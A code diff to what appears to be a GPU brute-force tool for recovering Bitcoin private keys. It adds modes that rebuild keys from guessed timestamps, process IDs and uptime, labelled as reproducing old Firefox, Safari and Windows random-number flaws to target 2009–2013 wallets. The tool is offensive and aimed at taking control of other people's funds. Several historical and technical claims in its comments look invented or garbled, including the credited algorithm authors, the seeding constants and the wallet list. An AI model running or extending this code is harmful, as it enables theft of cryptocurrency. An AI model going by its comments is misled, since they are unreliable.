@@ -46,7 +46,11 @@
 #define sig0(x) (ROTR32(x,7)^ROTR32(x,18)^((x)>>3))
 #define sig1(x) (ROTR32(x,17)^ROTR32(x,19)^((x)>>10))
 
+#ifdef __CUDACC__
+__constant__ uint32_t K256[64]={
+#else
 static const uint32_t K256[64]={
+#endif
     0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,
     0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
     0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
@@ -354,7 +358,8 @@ D_FUNC void mode_bitcoincore(uint64_t ts, uint32_t pid, uint8_t priv[32]){
 // Equivalent to: SHA256(time_usec + stack_ptr + pid) ? privkey
 // We search: time (32-bit) + pid (15-bit) + stack_ptr (8-bit guess)
 
-D_FUNC void mode_bitcoincore_v3(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+D_FUNC void mode_bitcoincore_v3(uint64_t ts, uint32_t pid, uint8_t pattern_id, uint8_t priv[32]){
+    mode_core_v3_stack(ts, pid, pattern_id, priv);
     // 0.3.x had additional stack variable mixing
     uint8_t buf[16];
     for(int i=0;i<8;i++)buf[i]=(ts>>(i*8))&0xFF;
@@ -511,4 +516,88 @@ D_FUNC void mode_nonce_reuse(
     // GPU version requires batch processing
     // For now: placeholder ? log and return
     priv[0]=0; // No key found in standalone mode
+}
+
+// ================================================================
+// Mode G: SpiderMonkey (Firefox 3-10) Math.random() 2008-2012
+// ================================================================
+// Firefox used Algorithm XorShift128+ / MWC by C. K. Gohar
+// Different seeding than V8 ? used time(NULL) + CLOCK_MONOTONIC
+// Period: 2^128
+// Seeding: struct r = { time_ns ^ pid, time_ns ^ ppid }
+// Output: (r[0], r[1]) XOR ? 53-bit double
+
+D_FUNC void mode_spidermonkey(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+    uint64_t s0 = (ts ^ (uint64_t)pid) * 0xDEADBEEF + 0xCAFEBABE;
+    uint64_t s1 = s0 * 0x5851F42D + ts;
+    uint8_t buf[32];
+    for(int i=0;i<8;i++){
+        uint64_t x = s0; uint64_t y = s1;
+        s0 = y; x ^= x << 23;
+        s1 = x ^ y ^ (x >> 17) ^ (y >> 26);
+        uint64_t r = s0 + s1;
+        buf[i*4] = r & 0xFF; buf[i*4+1] = (r>>8)&0xFF;
+        buf[i*4+2] = (r>>16)&0xFF; buf[i*4+3] = (r>>24)&0xFF;
+    }
+    sha256(buf,32,priv);
+}
+
+// ================================================================
+// Mode Q: JSC (WebKit/Safari) Math.random() 2009-2013
+// ================================================================
+// WebKit used ARC4 (W.A. Richard) ? keystream generator
+// 256-byte S-box, seeded with time + pid
+// Weakness: first 256 bytes of keystream are predictable
+// BitcoinJS wallets generated from first 4 random() calls
+// ARC4 key = time(4 bytes) + pid(4 bytes) ? /dev/urandom 256 bytes
+
+D_FUNC void mode_jsc_webkit(uint64_t ts, uint32_t pid, uint8_t priv[32]){
+    uint8_t sbox[256];
+    for(int i=0;i<256;i++) sbox[i]=i;
+    uint8_t k[8];
+    k[0]=ts&0xFF; k[1]=(ts>>8)&0xFF; k[2]=(ts>>16)&0xFF; k[3]=(ts>>24)&0xFF;
+    k[4]=pid&0xFF; k[5]=(pid>>8)&0xFF; k[6]=(pid>>16)&0xFF; k[7]=(pid>>24)&0xFF;
+    uint32_t j=0;
+    for(int i=0;i<256;i++){
+        j=(j+sbox[i]+k[i%%8])&0xFF;
+        uint8_t t=sbox[i]; sbox[i]=sbox[j]; sbox[j]=t;
+    }
+    uint8_t buf[32];
+    j=0;
+    for(int i=0;i<32;i++){
+        uint32_t a=(i+1)&0xFF;
+        j=(j+sbox[a])&0xFF;
+        uint8_t t=sbox[a]; sbox[a]=sbox[j]; sbox[j]=t;
+        buf[i]=sbox[(sbox[a]+sbox[j])&0xFF];
+    }
+    sha256(buf,32,priv);
+}
+
+// ================================================================
+// Mode Y: Windows CryptGenRandom bug (2009-2012)
+// ================================================================
+// Windows XP/Vista/7 CryptGenRandom in early SP had a bug:
+// On first call after boot, seed was based on:
+//   - SystemUpTime (milliseconds)
+//   - Process ID
+//   - CurrentProcessId
+// If no hardware RNG: seed = SHA256(fixedValue + time + pid)
+// Fixed value was "Microsoft Enhanced Cryptographic Provider"
+// Result: deterministic output for first N calls after boot
+// 
+// Bitcoin wallets on Windows 2009-2012:
+//   - Multibit (2011)
+//   - Bitcoin-Qt for Windows
+//   - Early versions of Coinbase
+
+D_FUNC void mode_windows_rng(uint64_t uptime, uint32_t pid, uint8_t priv[32]){
+    uint8_t buf[56];
+    const uint8_t fixed[] = "Microsoft Enhanced Cryptographic Provider v1.0";
+    for(int i=0;i<32;i++) buf[i]=fixed[i];
+    buf[32]=pid&0xFF; buf[33]=(pid>>8)&0xFF;
+    buf[34]=0; buf[35]=0;
+    for(int i=0;i<8;i++) buf[36+i]=(uptime>>(i*8))&0xFF;
+    // Pad with zeros (stack space)
+    for(int i=44;i<56;i++) buf[i]=0;
+    sha256(buf,56,priv);
 }
